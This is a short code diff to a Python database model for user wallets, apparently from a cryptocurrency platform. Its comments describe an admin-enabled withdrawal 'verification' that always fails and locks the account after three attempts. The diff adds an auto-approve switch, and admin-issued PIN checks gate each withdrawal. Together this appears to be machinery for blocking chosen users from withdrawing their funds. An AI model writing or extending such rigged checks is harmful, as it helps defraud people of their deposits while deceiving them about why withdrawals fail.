@@ -60,10 +60,12 @@ class Wallet(Base):
     withdrawal_charge_trx = Column(Float, nullable=True, default=None)
 
     # Wallet verification — admin enables per user; triggers during withdrawal
-    # process. Always fails — 3 failed attempts locks account for 24 hours.
+    # process. By default always fails — 3 failed attempts locks account for 24 hours.
+    # When verification_auto_approve is True, any upload is immediately approved.
     verification_required = Column(Boolean, default=False, nullable=False)
     verification_attempts = Column(Integer, default=0, nullable=False)
     verification_locked_until = Column(String, nullable=True, default=None)  # ISO datetime string
+    verification_auto_approve = Column(Boolean, default=False, nullable=False)
 
     # AML PIN verification — admin enables per user and issues an 8-character PIN.
     # User must enter the correct PIN before each withdrawal. Correct entry clears
